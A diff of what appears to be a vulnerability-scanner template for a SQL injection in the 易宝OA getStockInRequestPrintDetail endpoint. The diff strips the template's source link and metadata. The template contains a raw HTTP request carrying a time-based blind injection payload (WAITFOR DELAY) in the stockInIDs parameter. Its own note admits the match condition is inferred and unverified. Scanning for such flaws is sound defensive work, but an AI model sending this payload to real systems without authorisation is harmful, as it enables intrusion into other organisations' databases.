@@ -3,13 +3,8 @@ info:
   name: 易宝OA getStockInRequestPrintDetail SQL注入
   author: hacktwo
   severity: high
-  description: '来源: 语雀漏洞知识库 https://www.yuque.com/hacktwo/dtdx2v/nf7efqgu5gld5dz0
-
-    [!] 推断说明: 状态码缺失, 推断为 200。原文响应特征为截图, 无法自动提取文本命中条件, 使用前请人工核验。'
+  description: '[!] 推断说明: 状态码缺失, 推断为 200。原文响应特征为截图, 无法自动提取文本命中条件, 使用前请人工核验。'
   tags: sqli,2024
-  metadata:
-    source: yuque-hacktwo-dtdx2v
-    doc-slug: nf7efqgu5gld5dz0
 http:
 - raw:
   - 'GET /SmartTradeScan/StockIn/getStockInRequestPrintDetail?stockInIDs=1);WAITFOR%20DELAY%20%270:0:5%27-- HTTP/1.1
@@ -25,9 +20,6 @@ http:
 
 
     Connection: close
-
-
-    ![](https://cdn.nlark.com/yuque/0/2024/png/43110909/1717058294901-4e67d969-28e6-4b76-b9fe-23a6abf5f312.png)
 
 
     ## 修复建议
